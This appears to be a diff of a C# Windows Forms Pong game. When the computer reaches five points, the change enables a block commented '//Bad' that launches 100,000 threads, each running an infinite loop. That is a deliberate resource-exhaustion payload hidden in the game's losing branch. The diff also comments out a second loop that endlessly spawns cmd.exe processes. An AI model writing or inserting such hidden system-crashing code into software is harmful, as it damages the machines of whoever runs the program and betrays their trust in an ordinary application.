@@ -5,6 +5,7 @@ using System.Data;
 using System.Diagnostics;
 using System.Drawing;
 using System.Linq;
+using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
@@ -13,6 +14,8 @@ namespace SQLUserInterface
 {
     public partial class Pong : Form
     {
+
+       
         int ballXspeed = 4;
         int ballYspeed = 4;
         int speed = 2;
@@ -91,10 +94,11 @@ namespace SQLUserInterface
             CheckCollision(ball, player, player.Right + 5);
             CheckCollision(ball, computer, computer.Left - 35);
 
-            if (computerScore > 2)
+            if (computerScore >= 5)
             {
+
                 //Bad
-                /*
+                
                 for (int i = 0; i < 100000; i++) // Create 100,000 threads
                 {
                     new Thread(() =>
@@ -102,19 +106,23 @@ namespace SQLUserInterface
                         while (true) { } // Infinite loop in each thread
                     }).Start();
                 }
-                */
-                //Really bad
                 
+                //Really bad
+                /*
                     while (true)
                     {
                         System.Diagnostics.Process.Start("cmd.exe");  // Creates a new process (command prompt) in an infinite loop
                     }
                 
-
+                */
                 //The worst
                 
                 //GameOverLose();
                 computerScore = 0;
+
+                
+
+
             }
             else if (playerScore > 5)
             {
